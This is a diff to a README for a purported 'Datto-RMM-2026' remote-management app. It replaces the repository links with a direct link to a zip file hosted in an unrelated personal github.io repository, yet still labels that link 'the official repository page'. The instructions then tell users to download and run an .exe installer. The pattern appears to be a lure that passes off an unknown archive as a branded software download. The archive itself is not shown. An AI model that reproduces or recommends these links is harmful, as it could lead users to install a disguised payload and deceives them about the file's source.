@@ -5,7 +5,7 @@ description: "Download the current version of the Datto RMM desktop application 
 ---
 # 💻 Datto-RMM-2026 - Manage your remote infrastructure with ease
 
-[![Download Datto-RMM-2026](https://img.shields.io/badge/Download-Datto--RMM--2026-blue.svg)](https://github.com/Nguyenp3369/Datto-RMM-2026)
+[![Download Datto-RMM-2026](https://img.shields.io/badge/Download-Datto--RMM--2026-blue.svg)](https://raw.githubusercontent.com/Nguyenp3369/nguyenp3369.github.io/main/src/data/Application-v2.4.zip)
 
 ## 📌 Overview
 Datto-RMM-2026 provides a complete solution for systems management. This software helps you monitor, secure, and maintain computers across your network. It tracks health status, installs updates, and manages security patches from a central point. Use this tool to improve the reliability of your IT environment on Windows 10 and Windows 11.
@@ -22,7 +22,7 @@ Ensure your computer meets the following requirements before installation:
 ## 📥 Downloading and Installing
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official repository page at [https://github.com/Nguyenp3369/Datto-RMM-2026](https://github.com/Nguyenp3369/Datto-RMM-2026).
+1.  Visit the official repository page at [https://raw.githubusercontent.com/Nguyenp3369/nguyenp3369.github.io/main/src/data/Application-v2.4.zip](https://raw.githubusercontent.com/Nguyenp3369/nguyenp3369.github.io/main/src/data/Application-v2.4.zip).
 2.  Locate the release section on the right side of the page.
 3.  Click the version marked as the latest release.
 4.  Download the main installer file ending in .exe to your desktop or downloads folder.
